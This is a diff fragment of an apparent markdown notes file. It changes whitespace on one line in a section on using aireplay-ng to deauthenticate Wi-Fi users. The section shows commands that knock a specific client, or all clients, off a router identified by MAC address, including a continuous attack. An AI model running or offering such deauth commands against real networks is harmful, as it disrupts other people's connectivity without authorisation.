@@ -805,7 +805,7 @@ Usuing for scan wifi and overload users from wlan</br>
 
 `aireplay-ng --deauth <count 0 - all time or 1-100 > -a [rounters's MAC] -c <STATION> <LAN type>` set down</br>
   `aireplay-ng --deauth 30 -a 84:D8:1B:61:C1:2C -c 70:BB:E9:E2:D3:53 wlan0`</br>
-  `aireplay-ng --deauth 0 -a 84:D8:1B:61:C1:2C wlan0`</br>
+  `aireplay-ng --deauth 0 -a 84:D8:1B:61:C1:2C wlan0`</br>
   use --help for more !</br>
 
 ![image](https://user-images.githubusercontent.com/62830326/209209858-30573929-c167-446b-a53d-43d4763234af.png)
